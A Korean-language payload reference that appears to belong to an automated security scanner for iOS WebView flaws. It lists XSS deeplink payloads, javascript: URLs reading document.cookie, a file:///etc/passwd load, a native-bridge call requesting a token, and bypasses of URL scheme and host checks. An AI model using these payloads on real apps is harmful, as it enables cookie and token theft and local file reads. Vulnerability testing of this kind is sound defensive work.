### 기본 페이로드

#### WEBVIEW_JS_INJECT — 앱 내 JS 주입 확인

```
# 앱 실행 후 커스텀 URL scheme / deeplink로 XSS 페이로드 전달
# 예: myapp://webview?content=<img onerror=alert(1) src=x>

# 앱이 evaluateJavaScript로 사용자 입력을 실행하는 경우
# frida 또는 objection으로 런타임 hooking
frida -U -n TargetApp -e "
  var WKWebView = ObjC.classes.WKWebView;
  Interceptor.attach(WKWebView['- evaluateJavaScript:completionHandler:'].implementation, {
    onEnter: function(args) {
      console.log('JS injected:', ObjC.Object(args[2]).toString());
    }
  });
"
```

#### NAVIGATION_UNVALIDATED — 임의 URL 네비게이션

```
# WebView에 로드되는 URL을 deeplink/IPC로 조작
# 앱이 javascript: scheme을 차단하는지 확인
myapp://open?url=javascript:alert(document.cookie)
myapp://open?url=file:///etc/passwd
myapp://open?url=data:text/html,<script>alert(1)</script>
```

#### JS_BRIDGE_EXPOSURE — 네이티브 브리지 접근

```javascript
// WKScriptMessageHandler bridge가 노출된 경우
// 신뢰되지 않은 페이지에서 브리지 호출 시도
window.webkit.messageHandlers.bridge.postMessage({
  action: "getToken",
  data: {}
});
```

### 우회 페이로드

```
# scheme 검증 우회
javascript:%0aalert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# host 검증 우회 (startsWith/contains)
https://evil.com/https://allowed.com/path
https://allowed.com.evil.com/

# URL 인코딩
%6a%61%76%61%73%63%72%69%70%74%3aalert(1)
```

### 참고사항

- **WEBVIEW_JS_INJECT**: `evaluateJavaScript` 인자에 사용자 입력이 포함되면 코드 증거만으로 `confirmed` 처리 가능
- **NAVIGATION_UNVALIDATED**: Phase 2에서 실제 navigation을 트리거해 임의 URL 로드 여부 확인

### Phase 2 결과 파일 형식

```markdown
<!-- NOAH-SAST PHASE2 MANIFEST v2 -->
```json
{
  "scanner": "ios-webview-scanner",
  "schema_version": 2,
  "results": [
    {
      "id": "IOS_WEBVIEW-1",
      "evidence": {
        "commands": ["frida -U -n TargetApp -e \"...\""],
        "responses": {"http_status": 0, "body_excerpt": "JS injected: callback('payload')"},
        "observations": ["evaluateJavaScript called with user-controlled string"]
      }
    }
  ]
}
```
<!-- /NOAH-SAST PHASE2 MANIFEST -->
```
